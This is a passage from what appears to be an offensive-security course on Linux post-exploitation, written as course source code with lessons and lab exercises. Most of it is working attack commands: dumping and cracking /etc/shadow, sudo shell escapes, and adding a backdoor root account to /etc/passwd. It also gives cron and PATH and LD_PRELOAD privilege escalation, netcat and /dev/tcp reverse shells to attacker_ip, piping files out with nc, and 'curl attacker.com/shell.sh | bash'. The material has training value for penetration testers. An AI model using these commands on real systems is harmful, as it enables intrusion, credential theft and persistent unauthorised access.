# Get usernames and their shells (fields 1 and 7)
cut -d: -f1,7 /etc/passwd

# Get only accounts with interactive shells
grep -v "nologin\|false\|sync\|shutdown\|halt" /etc/passwd | cut -d: -f1

# Get only service accounts (UID < 1000, not root)
awk -F: '$3 > 0 && $3 < 1000 {print $1, $3, $7}' /etc/passwd
\`\`\`

**The format of each line:**

\`\`\`
username:x:UID:GID:GECOS:home_directory:shell

root:x:0:0:root:/root:/bin/bash
alice:x:1000:1000:Alice Smith:/home/alice:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/false
\`\`\`

| Field | Value | Meaning |
|---|---|---|
| 1 | username | Login name |
| 2 | `x` | Password (stored in /etc/shadow). If this is a hash, shadow is not used — rare. |
| 3 | UID | Numeric user ID. 0 = root. |
| 4 | GID | Primary group ID |
| 5 | GECOS | Comment field — full name, contact info |
| 6 | Home | Home directory |
| 7 | Shell | Login shell. `nologin` or `false` = cannot log in interactively. |

**The `/etc/shadow` file:**

\`\`\`bash
# View the shadow file — requires root
sudo cat /etc/shadow

# If you have read access to shadow (misconfiguration or group membership):
cat /etc/shadow
\`\`\`

**The format of each line:**

\`\`\`
username:$algorithm$salt$hash:last_changed:min:max:warn:inactive:expire:reserved

root:$6$randomsalt$verylonghashstring:19000:0:99999:7:::
alice:$6$anothersalt$anotherhash:19000:0:99999:7:::
bob:!:19000:0:99999:7:::   # Account locked (! prefix)
charlie:*:19000:0:99999:7:::  # No password, cannot log in
\`\`\`

**Hash algorithm prefixes:**

| Prefix | Algorithm | Security |
|---|---|---|
| `$1$` | MD5 | Very weak — cracks in seconds |
| `$2a$` / `$2b$` | Bcrypt | Strong — designed to be slow |
| `$5$` | SHA-256 | Moderate |
| `$6$` | SHA-512 | Strong but fast — crackable with GPUs |
| `$y$` | Yescrypt | Very strong — modern default |
| `!` prefix | Account locked | Cannot authenticate |
| `*` | No password set | No interactive login |

**Cracking password hashes (post-exploitation with permission):**

\`\`\`bash
# Extract the shadow file hashes
sudo cat /etc/shadow | grep -v "!\|*" > hashes.txt

# Crack with hashcat (GPU accelerated)
# SHA-512crypt hashes (mode 1800)
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA-256crypt hashes (mode 7400)
hashcat -m 7400 hashes.txt /usr/share/wordlists/rockyou.txt

# MD5crypt hashes (mode 500)
hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules (tries variations of wordlist passwords)
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Crack with John the Ripper (CPU based)
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Unshadow (combine passwd and shadow for John)
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
john --show unshadowed.txt
hashcat -m 1800 hashes.txt --show
\`\`\`

**Exercise:** On your Kali machine, examine `/etc/passwd` and (if accessible) `/etc/shadow`. Answer: How many user accounts have interactive shells? What hash algorithm are the passwords stored with? Are any accounts locked? What would an attacker's next step be after gaining read access to `/etc/shadow`?`,
              image: '02-passwd.png',
            },
            {
              title: 'Changing Permissions and Ownership',
              instruction:
                `Understanding how to modify permissions is critical for setting up your own tooling on a compromised system, understanding what an attacker can and cannot do after gaining a foothold, and identifying misconfigurations that leave files or directories unnecessarily open.

**chmod — changing file permissions:**

\`\`\`bash
# Numeric (octal) mode — most common in professional contexts
chmod 755 script.sh    # owner: rwx, group: r-x, world: r-x
chmod 644 file.txt     # owner: rw-, group: r--, world: r--
chmod 600 private.key  # owner: rw-, group: ---, world: --- (private key permissions)
chmod 700 ~/.ssh       # owner: rwx, group: ---, world: --- (SSH directory)
chmod 777 /tmp/shared  # everyone: rwx (insecure, but common misconfiguration)

# Symbolic mode — more readable for specific changes
chmod u+x script.sh    # Add execute for owner (u)
chmod g-w file.txt     # Remove write for group (g)
chmod o-rwx file.txt   # Remove all permissions for world (o)
chmod a+r file.txt     # Add read for everyone (a = all: u+g+o)
chmod u=rw,go=r file.txt  # Set exact permissions: owner rw, group r, world r

# Recursive — apply to directory and all contents
chmod -R 755 /var/www/html/

# Recursive with find (safer — apply different permissions to files vs dirs)
find /var/www/html -type f -exec chmod 644 {} \;   # Files: 644
find /var/www/html -type d -exec chmod 755 {} \;   # Directories: 755

# Set SUID bit
chmod u+s /usr/local/bin/mytool
chmod 4755 /usr/local/bin/mytool

# Set SGID bit
chmod g+s /shared/directory
chmod 2755 /shared/directory

# Set Sticky bit (on /tmp and shared directories)
chmod +t /tmp/shared
chmod 1777 /tmp/shared
\`\`\`

**chown — changing file ownership:**

\`\`\`bash
# Change owner of a file
sudo chown root file.txt

# Change owner and group simultaneously
sudo chown root:www-data /var/www/html/config.php

# Change just the group
sudo chgrp www-data /var/www/html/config.php

# Recursive ownership change
sudo chown -R www-data:www-data /var/www/html/

# Change to current user (useful after creating files as root)
sudo chown $(whoami):$(whoami) myfile.txt

# Copy ownership from another file
sudo chown --reference=/etc/passwd /tmp/myfile
\`\`\`

**Common permission patterns and what they mean:**

\`\`\`bash
# Web application files — world readable, owner writable
-rw-r--r--  root  root  index.html     # 644

# Web application config — only web server can read (credentials inside)
-rw-r-----  root  www-data  config.php # 640

# Executable scripts
-rwxr-xr-x  root  root  script.sh     # 755

# Private SSH keys — MUST be 600 (SSH will refuse to use more open keys)
-rw-------  alice  alice  id_rsa        # 600

# SSH directory — MUST be 700
drwx------  alice  alice  .ssh/         # 700

# /etc/shadow — accessible only by root and shadow group
-rw-r-----  root  shadow  /etc/shadow   # 640

# /etc/passwd — world readable (contains no secret data)
-rw-r--r--  root  root  /etc/passwd    # 644

# Badly configured config file — world readable with credentials
-rw-r--r--  root  root  database.conf  # 644 BAD — anyone can read credentials
\`\`\`

**Dangerous permission combinations to look for:**

\`\`\`bash
# World-writable configuration files
find /etc -perm -o+w -type f 2>/dev/null

# World-writable web application files
find /var/www -perm -o+w -type f 2>/dev/null

# Group-writable files owned by sensitive groups
find / -perm -g+w -group root -type f 2>/dev/null

# SUID binaries NOT in the default expected set
find / -perm -4000 -type f 2>/dev/null | sort

# Directories writable by current user (for placing malicious files)
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys
\`\`\`

**Exercise:** Create a directory called `permlab` in your home directory. Inside it, create five files and apply the following permissions to each: 777, 755, 644, 600, and 400. Verify each with `ls -la`. Then explain in your notes: which file is a security risk and why? Which file would refuse SSH authentication if it were a private key?`,
              image: '03-chmod.png',
            },
            {
              title: 'sudo and Privilege Escalation Basics',
              instruction:
                ``sudo` (superuser do) allows permitted users to run commands as root or another user. It is one of the most important concepts in Linux privilege escalation — both because misconfigured sudo rules are one of the most common paths to root, and because understanding sudo is essential for operating on your own systems.

**Basic sudo usage:**

\`\`\`bash
# Run a single command as root
sudo whoami

# Run a command as a specific user
sudo -u www-data whoami

# Open an interactive root shell (requires sudo access to /bin/bash or similar)
sudo -i
sudo -s
sudo /bin/bash
sudo su -

# List what commands you are permitted to run with sudo
sudo -l

# Run sudo without a password cache (forces re-authentication)
sudo -k; sudo whoami

# Run a command as root in a specific directory
sudo -D /var/www bash -c "whoami && ls"
\`\`\`

**Reading `sudo -l` output — critical for privilege escalation:**

\`\`\`bash
# Example output:
Matching Defaults entries for alice on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User alice may run the following commands on target:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /bin/cp
    (www-data) NOPASSWD: /usr/bin/python3 /var/scripts/cleanup.py
\`\`\`

**Interpreting each rule:**

| Rule | Meaning | Risk |
|---|---|---|
| `(ALL : ALL) ALL` | Run any command as any user — full root | Complete system compromise |
| `(root) NOPASSWD: /usr/bin/find` | Run find as root without a password | Privilege escalation via GTFOBins |
| `(root) NOPASSWD: /usr/bin/vim` | Run vim as root without a password | Privilege escalation via shell escape |
| `(www-data) NOPASSWD: /usr/bin/python3 /var/scripts/cleanup.py` | Run a specific script as www-data | Depends on whether the script or its imports are writable |

**Exploiting common sudo misconfigurations:**

\`\`\`bash
# GTFOBins: https://gtfobins.github.io — always check this first

# find — spawn a shell through -exec
sudo find /etc -exec /bin/bash \;
sudo find . -exec /bin/sh \; -quit

# vim — shell escape using :!
sudo vim -c ':!/bin/bash'
sudo vim /etc/passwd  # Then inside vim: :!/bin/bash

# python / python3
sudo python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
sudo python -c 'import pty; pty.spawn("/bin/bash")'

# perl
sudo perl -e 'exec "/bin/bash";'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# less / more — spawn a shell from the pager
sudo less /etc/passwd  # Then inside less: !/bin/bash

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# cp — overwrite /etc/passwd
# Generate a password hash first:
openssl passwd -6 -salt xyz newpassword
# Then create a new passwd file with a root-equivalent entry:
echo 'hacker:$6$xyz$[HASH]:0:0:hacker:/root:/bin/bash' >> /tmp/passwd
sudo cp /tmp/passwd /etc/passwd
su hacker  # Enter 'newpassword'

# nano — write to files you should not be able to reach
sudo nano /etc/sudoers  # Add: ALL=(ALL:ALL) NOPASSWD: ALL

# tar — execute commands through checkpoint
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# env — preserve environment with sudo to bypass restrictions
sudo env /bin/bash
\`\`\`

**The sudoers file:**

\`\`\`bash
# View the sudoers file (requires root or sudo)
sudo cat /etc/sudoers
sudo visudo  # Safe editor for sudoers — validates syntax before saving

# Additional sudoers rules can be in drop-in files:
ls -la /etc/sudoers.d/

# Sudoers file format:
# user  hostname=(runas_user:runas_group)  NOPASSWD: command

# Examples:
alice   ALL=(ALL:ALL)  ALL          # alice can sudo anything
bob     ALL=(root)     /usr/bin/apt # bob can only run apt as root
charlie ALL=(ALL)      NOPASSWD: ALL # charlie can sudo without a password
\`\`\`

**Exercise:** Run `sudo -l` on your system. Copy the entire output into your notes. For each permitted command, look it up on GTFOBins. Document: does it have a privilege escalation technique? What is the technique? Then attempt the escalation in a controlled environment (your own Kali VM or a vulnerable machine) and document whether it succeeded.`,
              image: '04-sudo.png',
            },
            {
              title: 'Cron Jobs and Scheduled Tasks',
              instruction:
                `Cron jobs are scheduled commands that run automatically at specified times. They are a frequent source of privilege escalation vulnerabilities because they are often configured to run as root, and the scripts they execute are sometimes writable by less-privileged users.

**Understanding cron:**

\`\`\`bash
# View your own crontab
crontab -l

# Edit your crontab
crontab -e

# View the system-wide crontab
cat /etc/crontab

# View system cron directories (scripts in these directories run automatically)
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# View all user crontabs (requires root)
ls -la /var/spool/cron/crontabs/
sudo cat /var/spool/cron/crontabs/alice

# Find cron jobs from logs
grep CRON /var/log/syslog
grep "CMD" /var/log/cron.log 2>/dev/null
\`\`\`

**Reading the crontab format:**

\`\`\`bash
# Field order: minute hour day_of_month month day_of_week command
# * = any value    */5 = every 5 units    1-5 = range    1,3,5 = list

# Run /opt/backup.sh as root every minute
* * * * * root /opt/backup.sh

# Run cleanup.py every day at 2:30 AM
30 2 * * * www-data /usr/bin/python3 /var/www/scripts/cleanup.py

# Run on weekdays at 9 AM
0 9 * * 1-5 alice /home/alice/work_report.sh

# Run every 5 minutes
*/5 * * * * root /usr/local/bin/monitor.sh
\`\`\`

**Privilege escalation via cron:**

\`\`\`bash
# Step 1: Identify cron jobs running as root
cat /etc/crontab
ls -la /etc/cron.d/
grep -r "root" /etc/cron* 2>/dev/null

# Step 2: Check the permissions on the scripts being executed
ls -la /opt/backup.sh   # Is this writable?
ls -la /usr/local/bin/monitor.sh

# Step 3: If the script is world-writable, inject a payload
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /opt/backup.sh
# Wait for the cron job to execute — this gives you a root reverse shell

# Step 4: If the script is not writable, check if it imports from a writable location
cat /opt/backup.sh
# If it contains: cd /tmp && ./helper.sh
# And /tmp is world-writable, you can place your own helper.sh

# Step 5: Check for PATH abuse in crontab
cat /etc/crontab | grep PATH
# If PATH includes a writable directory before /usr/bin:
# PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
# And the cron job calls a command without a full path:
# * * * * * root cleanup
# Then placing your own 'cleanup' binary in /tmp will be executed as root
\`\`\`

**Using pspy to monitor cron jobs without root:**

\`\`\`bash
# pspy monitors process creation without requiring root privileges
# Download from: https://github.com/DominicBreuker/pspy

# On the target (after gaining a shell):
wget http://attacker_ip/pspy64 -O /tmp/pspy
chmod +x /tmp/pspy
/tmp/pspy

# Watch the output — every process creation is shown with its full command line
# Look for processes running as UID=0 (root) that you can influence
\`\`\`

**Exercise:** On your Kali machine, create a cron job that runs every minute and appends the current date and time to `/tmp/cron_test.txt`. Verify it is running by checking the file. Then, research a real-world privilege escalation via a misconfigured cron job (search for "cron job privilege escalation CTF writeup"). Write a step-by-step explanation of how the escalation worked.`,
              image: null,
            },
            {
              title: 'Environment Variables and PATH Manipulation',
              instruction:
                `Environment variables store configuration values that processes inherit from their parent. They are a common source of credential exposure and a classic privilege escalation vector when combined with SUID binaries or sudo misconfigurations.

**Viewing and setting environment variables:**

\`\`\`bash
# Show all environment variables
env
printenv

# Show a specific variable
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# Show variables set in the current shell
set | grep -v "^_"

# Set a variable for the current session
export MYVAR="hello"
echo $MYVAR

# Unset a variable
unset MYVAR

# Set a variable for a single command (does not persist)
MYVAR="test" command
\`\`\`

**Common environment variables of interest to attackers:**

\`\`\`bash
# PATH — directories searched for commands
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# If a SUID binary calls commands without full paths, PATH manipulation works:
# export PATH=/tmp:$PATH  — /tmp is searched FIRST
# Place a malicious script at /tmp/ls → SUID binary calls 'ls' → executes your script as root

# LD_PRELOAD — shared libraries loaded before all others
echo $LD_PRELOAD
# If set and respected by sudo (env_keep += LD_PRELOAD), can inject code into root processes

# LD_LIBRARY_PATH — additional directories to search for shared libraries
echo $LD_LIBRARY_PATH

# HOME — if a root process writes to $HOME and HOME is writable by you, you may be able to influence it
echo $HOME

# HISTFILE / HISTSIZE — where history is stored, and how many entries
echo $HISTFILE    # Usually ~/.bash_history
echo $HISTSIZE    # Usually 1000

# Credentials in environment variables (extremely common misconfiguration)
env | grep -i "pass\|secret\|key\|token\|api\|auth\|cred"
\`\`\`

**PATH hijacking with SUID binaries:**

\`\`\`bash
# Scenario: A SUID binary /usr/local/bin/backup calls 'tar' without a full path
strings /usr/local/bin/backup | grep -v "^$"
# Output includes: tar czf /tmp/backup.tar.gz /home/

# Exploitation:
# 1. Create a malicious 'tar' in /tmp
echo '#!/bin/bash' > /tmp/tar
echo 'bash -p' >> /tmp/tar  # -p preserves SUID privileges
chmod +x /tmp/tar

# 2. Prepend /tmp to PATH
export PATH=/tmp:$PATH

# 3. Run the SUID binary
/usr/local/bin/backup
# It calls 'tar', finds /tmp/tar first, executes it as the binary's owner (root)
# You now have a root shell
\`\`\`

**LD_PRELOAD escalation:**

\`\`\`bash
# Check if sudo preserves LD_PRELOAD
sudo -l | grep LD_PRELOAD

# If "env_keep += LD_PRELOAD" appears in sudo -l output:

# 1. Write a malicious shared library
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# 2. Compile it as a shared library
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles

# 3. Run any sudo-permitted command with LD_PRELOAD set
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/find
# The _init() function executes before find does — you get a root shell
\`\`\`

**Exercise:** Run `env` on your Kali machine. Identify any variables that could be security-relevant. Then run `strings /usr/bin/sudo | head -50` and identify any commands it calls. Research one real-world privilege escalation technique that uses PATH manipulation. Write a step-by-step explanation of how it works.`,
              image: null,
            },
          ],
        },

        // ── Room 3 ─────────────────────────────────────────────────────────────
        {
          id: 'room3',
          title: 'Processes & Networking',
          overview:
            'Every running service is a potential attack surface. This room teaches you to enumerate what is running on a system, what network ports are open, how to interact with services from the command line, and how to manage processes — skills that are essential during both active exploitation and post-exploitation.',
          estimatedMinutes: 45,
          steps: [
            {
              title: 'Process Enumeration',
              instruction:
                `Processes are running programs. During post-exploitation, enumerating processes reveals what services are running, what users are running them, what credentials might be passed as command-line arguments, and what internal services are accessible only from localhost.

**Core process commands:**

\`\`\`bash
# List all running processes with full details
ps aux

# Column meanings:
# USER  — the user running the process
# PID   — process ID (unique identifier)
# %CPU  — CPU usage percentage
# %MEM  — memory usage percentage
# VSZ   — virtual memory size (KB)
# RSS   — resident set size (actual RAM used, KB)
# TTY   — terminal type (? = no terminal = daemon/service)
# STAT  — process state (R=running, S=sleeping, Z=zombie, D=uninterruptible)
# START — start time
# TIME  — total CPU time
# COMMAND — full command line

# Show process tree (parent-child relationships — reveals how processes were spawned)
ps auxf

# Show only root-owned processes
ps aux | awk '$1 == "root"'

# Show processes for a specific user
ps -u alice

# Show a specific process by name
ps aux | grep nginx
ps aux | grep python

# Interactive process viewer — real time
top
htop  # More user-friendly (sudo apt install htop)

# Show processes sorted by CPU usage
ps aux --sort=-%cpu | head -20

# Show processes sorted by memory usage
ps aux --sort=-%mem | head -20

# Find a process by name and get its PID
pgrep nginx
pgrep -a python3   # Also shows command line arguments

# Get the full command line of a specific process
cat /proc/1234/cmdline | tr '\0' ' '

# Get the full command line of all processes (readable format)
ps aux | awk '{print $2, substr($0, index($0,$11))}'
\`\`\`

**What to look for during enumeration:**

\`\`\`bash
# Processes running as root — anything unexpected?
ps aux | awk '$1 == "root" {print $2, $11, $12, $13}'

# Processes with credentials in their command line (common misconfiguration)
ps aux | grep -E "password|passwd|secret|key|token|api" --color=never

# Example of a vulnerable process:
# root 1234 ... /usr/bin/python3 backup.py --password=secretpassword123
# This password is visible to any user who runs 'ps aux'

# Processes running from /tmp (suspicious — may indicate prior compromise)
ps aux | grep "/tmp"

# Network daemons (services listening on ports)
ps aux | grep -E "nginx|apache|mysql|postgresql|redis|memcached|ssh|ftp"

# Processes running as web server user (may indicate web shell)
ps aux | awk '$1 == "www-data"'

# Checking /proc for additional process information
ls /proc/        # Each numbered directory is a running process
cat /proc/1/status  # Detailed status of PID 1 (init/systemd)

# Show all file descriptors open by a process (requires root for other users' processes)
ls -la /proc/1234/fd

# Show memory map of a process (may reveal loaded libraries and mapped files)
cat /proc/1234/maps
\`\`\`

**Exercise:** Run `ps auxf` and spend 5 minutes studying the output. In your notes, answer: Which process is the parent of all others? How many processes are running as root? Are there any processes with interesting command-line arguments? Are there any processes running from unexpected locations like `/tmp` or `/dev/shm`?`,
              image: '01-ps.png',
            },
            {
              title: 'Network Enumeration',
              instruction:
                `Knowing what ports are open and what services are listening is essential for both local post-exploitation enumeration and for planning your next move. Services listening on localhost are not accessible from the network but become accessible once you have a shell — this is called internal port pivoting.

**Listing open ports and connections:**

\`\`\`bash
# List all listening TCP and UDP ports with process names (modern, preferred)
ss -tulnp

# Flag meanings:
# -t  TCP sockets
# -u  UDP sockets
# -l  listening sockets only
# -n  show numeric addresses (no DNS resolution)
# -p  show process name and PID

# Alternative using netstat (older systems, may not be installed)
netstat -tulnp

# Show all established TCP connections
ss -tnp

# Show all sockets (listening + established)
ss -anp

# Show only listening TCP
ss -tlnp

# Show only listening UDP
ss -ulnp

# Show only connections for a specific process
ss -tp | grep nginx

# Filter by port number
ss -tlnp | grep :80
ss -tlnp | grep :443
ss -tlnp | grep :22
ss -tlnp | grep :3306   # MySQL
ss -tlnp | grep :5432   # PostgreSQL
ss -tlnp | grep :6379   # Redis
ss -tlnp | grep :27017  # MongoDB

# Show all ports in use (including established)
ss -anp | grep -v "CLOSE_WAIT\|TIME_WAIT"
\`\`\`

**Interpreting `ss -tulnp` output:**

\`\`\`bash
Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process
tcp    LISTEN  0       128     0.0.0.0:22           0.0.0.0:*          users:(("sshd",pid=878,fd=3))
tcp    LISTEN  0       511     127.0.0.1:3306       0.0.0.0:*          users:(("mysqld",pid=1234,fd=21))
tcp    LISTEN  0       128     0.0.0.0:80           0.0.0.0:*          users:(("nginx",pid=2345,fd=6))
tcp    LISTEN  0       128     127.0.0.1:8080       0.0.0.0:*          users:(("python3",pid=3456,fd=5))
udp    UNCONN  0       0       0.0.0.0:68           0.0.0.0:*                               
\`\`\`

| Address | Meaning | Accessible from? |
|---|---|---|
| `0.0.0.0:22` | SSH listening on all interfaces | Network (external) |
| `127.0.0.1:3306` | MySQL listening only on localhost | Internal only |
| `0.0.0.0:80` | HTTP listening on all interfaces | Network (external) |
| `127.0.0.1:8080` | App on localhost only | Internal only — escalation opportunity |

**Accessing localhost-only services after gaining a shell:**

\`\`\`bash
# MySQL on 3306 — accessible locally once you have a shell
mysql -u root -p         # Try common passwords
mysql -u root            # Try without a password
mysql -h 127.0.0.1 -u root -p

# Redis on 6379 — often unauthenticated
redis-cli -h 127.0.0.1
redis-cli -h 127.0.0.1 info
redis-cli -h 127.0.0.1 config get *  # Dump all configuration

# HTTP API on 8080 — might have admin endpoints not exposed externally
curl http://127.0.0.1:8080/
curl http://127.0.0.1:8080/admin
curl http://127.0.0.1:8080/api/v1/users
curl http://127.0.0.1:8080/health

# Memcached on 11211 — often unauthenticated
echo "stats" | nc 127.0.0.1 11211
echo "version" | nc 127.0.0.1 11211
\`\`\`

**Routing and network interfaces:**

\`\`\`bash
# Show network interfaces and their IP addresses
ip addr show
ip a

# Show the routing table (where does traffic go?)
ip route show
route -n

# Show the ARP cache (what other hosts are on the local network?)
arp -a
ip neigh show

# Show DNS configuration
cat /etc/resolv.conf
cat /etc/hosts

# Test connectivity to another host
ping -c 4 192.168.1.1

# Trace the network path to a host
traceroute 8.8.8.8
\`\`\`

**Exercise:** Run `ss -tulnp` on your target machine. For every listening service, create a table entry with: port, protocol (TCP/UDP), process name, and whether it is accessible from the network or localhost only. For each localhost-only service, write one sentence explaining how you would attempt to access it after gaining a shell.`,
              image: '02-netstat.png',
            },
            {
              title: 'Network Connectivity Tools',
              instruction:
                `These tools let you test connectivity, interact with network services directly, and transfer files — all from the command line. Mastering them means you can work without a graphical interface, which is always the case once you have a shell on a remote target.

**ping and traceroute:**

\`\`\`bash
# Send 4 ICMP echo requests
ping -c 4 google.com

# Ping with a 1-second timeout per packet (useful for scripts)
ping -c 1 -W 1 192.168.1.1

# Ping a range of hosts quickly (host discovery)
for i in $(seq 1 254); do
    ping -c 1 -W 1 192.168.1.$i > /dev/null 2>&1 && echo "192.168.1.$i is UP"
done

# Traceroute using ICMP (default)
traceroute google.com

# Traceroute using TCP (better for firewalled networks — use port 80)
traceroute -T -p 80 google.com

# Traceroute using UDP (default on some systems)
traceroute -U google.com
\`\`\`

**DNS tools:**

\`\`\`bash
# Basic DNS lookup
nslookup google.com
dig google.com

# Query a specific DNS server
dig @8.8.8.8 google.com

# Look up specific record types
dig google.com A       # IPv4 address
dig google.com AAAA    # IPv6 address
dig google.com MX      # Mail servers
dig google.com NS      # Name servers
dig google.com TXT     # Text records (SPF, DKIM, verification tokens)
dig google.com CNAME   # Canonical name (alias)
dig google.com SOA     # Start of Authority

# Reverse DNS lookup (IP to hostname)
dig -x 8.8.8.8
nslookup 8.8.8.8

# Get short output only
dig +short google.com

# Get all record types (zone data — may be restricted)
dig google.com ANY
\`\`\`

**netcat (nc) — the Swiss army knife:**

\`\`\`bash
# Test if a TCP port is open
nc -zv 192.168.1.1 80
nc -zv 192.168.1.1 22

# Test a range of ports
nc -zv 192.168.1.1 20-100

# Test with a timeout (1 second)
nc -zvw1 192.168.1.1 80

# Connect to a service and interact (banner grabbing)
nc 192.168.1.1 22    # SSH banner
nc 192.168.1.1 25    # SMTP banner
nc 192.168.1.1 80    # HTTP (then type: GET / HTTP/1.0 and press Enter twice)

# Listen for incoming connections (simple listener)
nc -lvnp 4444

# Transfer a file from target to attacker
# Attacker: nc -lvnp 4444 > received_file
# Target:   nc attacker_ip 4444 < file_to_send

# Execute a command and pipe output to attacker
# Attacker: nc -lvnp 4444
# Target:   cat /etc/passwd | nc attacker_ip 4444

# Reverse shell using netcat (after gaining code execution on target)
# Attacker listens:  nc -lvnp 4444
# Target executes:   nc -e /bin/bash attacker_ip 4444

# If -e flag is not available (netcat-openbsd):
# Target executes:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc attacker_ip 4444 > /tmp/f

# UDP mode
nc -u 192.168.1.1 53   # UDP DNS test
\`\`\`

**curl and wget:**

\`\`\`bash
# Make a GET request and show full output
curl http://example.com

# Show response headers only
curl -I http://example.com

# Show both request and response headers (verbose)
curl -v http://example.com

# Follow redirects
curl -L http://example.com

# Make a POST request
curl -X POST -d "username=admin&password=test" http://example.com/login

# Make a POST with JSON
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test"}' \
  http://example.com/api/login

# Send custom headers
curl -H "Authorization: Bearer TOKEN" http://example.com/api/data
curl -H "X-Forwarded-For: 127.0.0.1" http://example.com/admin

# Send cookies
curl -b "session=abc123; admin=true" http://example.com/dashboard

# Download a file
curl -o output.txt http://example.com/file.txt
wget http://example.com/file.txt

# Download and execute (common post-exploitation technique)
curl http://attacker.com/shell.sh | bash
wget -qO- http://attacker.com/shell.sh | bash

# Check SSL certificate details
curl -v --ssl-no-revoke https://example.com 2>&1 | grep -A5 "SSL"
\`\`\`

**Exercise:** On your Kali machine, use `nc` to connect to port 22 on your target machine. Read the SSH banner and record the OpenSSH version. Then use `nc -zv` to test whether ports 80, 443, 3306, 5432, and 8080 are open on your target. Finally, use `curl -I` against port 80 and record every response header. What does each header reveal about the target?`,
              image: '03-ping.png',
            },
            {
              title: 'Process Control',
              instruction:
                `Managing processes is fundamental. During an engagement, you need to start listeners, run tools in the background, and maintain shells even after terminal disconnection. After gaining access to a target, you need to understand how to manage your own processes without accidentally triggering detection.

**Killing processes:**

\`\`\`bash
# Send SIGTERM (15) — graceful shutdown request (process can ignore this)
kill 1234

# Send SIGKILL (9) — immediate forced termination (cannot be ignored)
kill -9 1234

# Kill by name (all processes with this name)
killall nginx
killall python3

# Kill by pattern (more precise than killall)
pkill -f "python3 backup.py"

# Kill processes belonging to a specific user
pkill -u alice

# List available signals
kill -l
\`\`\`

**Background and foreground:**

\`\`\`bash
# Run a command in the background
nmap -p- 192.168.1.1 &

# List background jobs
jobs

# Bring background job to foreground (by job number)
fg %1

# Send a running foreground process to the background
# Press Ctrl+Z to pause it, then:
bg %1    # Resume it in the background

# Disown a job (it continues even if the terminal closes)
nohup nmap -p- 192.168.1.1 &
disown %1
\`\`\`

**tmux — terminal multiplexer (essential for operators):**

\`\`\`bash
# Start a new named session
tmux new-session -s main

# Key bindings (prefix is Ctrl+B by default):
# Ctrl+B c  — create new window
# Ctrl+B n  — next window
# Ctrl+B p  — previous window
# Ctrl+B "  — split pane horizontally
# Ctrl+B %  — split pane vertically
# Ctrl+B arrow  — switch between panes
# Ctrl+B d  — detach from session (leaves it running)
# Ctrl+B [  — scroll mode (q to exit)

# List sessions
tmux ls

# Attach to a session
tmux attach -t main

# Create a new window with a specific name
tmux new-window -n scanning

# Run a command in a new tmux window and leave it running
tmux new-session -d -s myscan -n nmap 'nmap -p- 192.168.1.1 -oA fullscan'

# Send a command to an existing tmux window
tmux send-keys -t myscan 'ls -la' Enter
\`\`\`

**screen — alternative to tmux:**

\`\`\`bash
# Start a new named screen session
screen -S mysession

# Detach: Ctrl+A then D
# Reattach
screen -r mysession

# List sessions
screen -ls

# Run a command in a new screen session in the background
screen -dmS scanning nmap -p- 192.168.1.1
\`\`\`

**Maintaining shells through disconnection:**

\`\`\`bash
# Using nohup:
nohup /bin/bash -c 'while true; do nc -lvnp 4444 -e /bin/bash; sleep 1; done' &

# Checking if a process survived disconnection:
pgrep -a ncat
pgrep -a nc

# A persistent reverse shell listener (auto-restarts on disconnect):
while true; do nc -lvnp 4444 -e /bin/bash 2>/dev/null; sleep 2; done &
\`\`\`

**Exercise:** Start a long-running command (`ping google.com`) in a tmux session. Detach from the session. Verify from outside tmux that the ping process is still running using `pgrep`. Reattach and kill the process. Document every tmux command you used.`,
              image: '04-kill.png',
            },
            {
              title: 'File Transfer Techniques',
              instruction:
                `Getting files onto and off a target is a critical operational skill. You need to transfer exploit code, tools, and data — and you need to do so in ways that minimise noise and work across different environments and firewall configurations.

**Transferring files from attacker to target:**

\`\`\`bash
# Method 1: Python HTTP server (most common, requires outbound HTTP from target)
# Attacker side — start the server in the directory containing your files:
cd /tmp/transfer
python3 -m http.server 8080

# Target side — download the file:
wget http://attacker_ip:8080/tool.sh -O /tmp/tool.sh
curl http://attacker_ip:8080/tool.sh -o /tmp/tool.sh

# Method 2: SCP (if you have SSH credentials to the target)
# From attacker to target:
scp /local/file.sh alice@192.168.1.100:/tmp/file.sh

# From target to attacker:
scp alice@192.168.1.100:/etc/passwd /tmp/stolen_passwd

# Method 3: Netcat (works without HTTP or SSH)
# Attacker listens and receives:
nc -lvnp 8080 > received_file

# Target sends:
cat /etc/shadow | nc attacker_ip 8080

# Method 4: Base64 encoding (when only a terminal is available — no file transfer tools)
# Attacker encodes the file:
